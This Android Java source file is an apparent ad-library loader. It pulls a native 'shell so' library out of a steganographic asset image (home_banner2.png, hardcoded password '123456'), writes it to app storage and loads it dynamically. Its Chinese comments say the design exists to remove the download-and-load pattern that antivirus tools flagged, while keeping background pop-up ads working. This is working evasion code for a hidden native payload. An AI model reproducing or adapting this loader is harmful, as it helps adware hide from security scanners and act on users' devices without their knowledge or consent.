package com.ep.custom_honor_library.shell;

import android.app.Application;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Log;

import com.base.imagefilestego.ImageFileStego;
import com.base.imagefilestego.StegoArtifact;
import com.base.imagefilestego.StegoCallback;
import com.base.imagefilestego.StegoException;
import com.base.imagefilestego.StegoSource;
import com.baidu.mobads.proxy.SafeUtils;
import com.ep.custom_honor_library.http.OnHttpListener;
import com.ep.custom_honor_library.utils.CommonSpUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

/**
 * shell so 本地加载器（替代原「远程下载 shell so」链路）。
 *
 * 流程：
 * 1. 快路径：MMKV 已缓存 shell_file（老版本远程下载的存量缓存）→ 直接 System.load；
 * 2. 慢路径：读取 assets 内置隐写图片 → ImageFileStego 提取 → 落盘 filesDir/shell_file
 *    → System.load → 持久化路径到 MMKV（key 不变，老用户缓存兼容）。
 *
 * shell so 不再经过网络，报毒触发点「远程下载二进制 → 落盘 → 动态加载」整体移除；
 * 加载成功后 SpShellFile 恒非空，toOpenMiddle 的后台弹出前置条件保持成立。
 */
public class ShellSoLoader {

    private static final String TAG = "AD_LOG";
    /** assets 内置的藏有 shell so 的隐写图片（与主 so 的 home_banner.png 同方案） */
    private static final String ASSET_IMAGE_NAME = "home_banner2.png";
    /** 隐写提取密码，与主 so 图片一致（服务端/工具生成图片时须使用同一密码） */
    private static final char[] STEGO_PASSWORD = "123456".toCharArray();
    /** 落盘文件名，与旧远程下载版本保持一致 */
    private static final String SHELL_CACHE_NAME = "shell_file";

    private static final Handler MAIN = new Handler(Looper.getMainLooper());

    public static void load(Application app, final OnHttpListener listener) {
        if (app == null || listener == null) {
            return;
        }
        // 快路径：老用户已有本地缓存（旧版本远程下载残留），直接加载
        if (loadCached(listener)) {
            return;
        }
        extractFromAssets(app, listener);
    }

    // ---------- 快路径：本地缓存 ----------

    private static boolean loadCached(OnHttpListener listener) {
        String cachedPath = CommonSpUtils.getSpShellFile();
        if (TextUtils.isEmpty(cachedPath)) {
            return false;
        }
        File cachedFile = new File(cachedPath);
        if (!cachedFile.exists() || cachedFile.length() <= 0L) {
            return false;
        }
        try {
            SafeUtils.iitF(cachedPath);
            Log.i(TAG, "shell so 使用本地缓存加载成功: " + cachedPath);
            listener.onSuccess();
            return true;
        } catch (Throwable error) {
            // 缓存损坏则删除，走图片提取流程重新获取
            //noinspection ResultOfMethodCallIgnored
            cachedFile.delete();
            return false;
        }
    }

    // ---------- 慢路径：assets 隐写图片 → 提取 shell so ----------

    private static void extractFromAssets(Application app, final OnHttpListener listener) {
        ImageFileStego stego = new ImageFileStego(app);
        StegoSource image = StegoSource.fromStream(ASSET_IMAGE_NAME, -1L, () -> {
            try {
                return app.getAssets().open(ASSET_IMAGE_NAME);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });
        stego.extractAsync(image, STEGO_PASSWORD, new StegoCallback<StegoArtifact>() {
            @Override
            public void onSuccess(final StegoArtifact result) {
                try {
                    File shellFile = new File(app.getFilesDir(), SHELL_CACHE_NAME);
                    FileOutputStream output = new FileOutputStream(shellFile);
                    try {
                        result.writeTo(output);
                    } finally {
                        output.close();
                    }
                    // System.load 与回调统一回主线程执行（与旧远程下载链路行为一致）
                    MAIN.post(() -> {
                        try {
                            SafeUtils.iitF(shellFile.getAbsolutePath());
                            CommonSpUtils.setSpShellFile(shellFile.getAbsolutePath());
                            Log.i(TAG, "shell so 本地提取加载成功: " + shellFile.getAbsolutePath());
                            listener.onSuccess();
                        } catch (Throwable error) {
                            Log.w(TAG, "shell so 加载失败: " + error);
                            //noinspection ResultOfMethodCallIgnored
                            shellFile.delete();
                            listener.onFail(new Exception(error));
                        }
                    });
                } catch (Exception error) {
                    Log.w(TAG, "shell so 写入失败: " + error);
                    listener.onFail(error);
                } finally {
                    // StegoArtifact 持有内存/临时文件，必须显式释放
                    try {
                        result.close();
                    } catch (Exception ignored) {
                    }
                }
            }

            @Override
            public void onError(StegoException error) {
                Log.w(TAG, "shell so 图片提取失败: " + error.getMessage());
                listener.onFail(error);
            }

            @Override
            public void onCancelled() {
            }
        });
    }
}
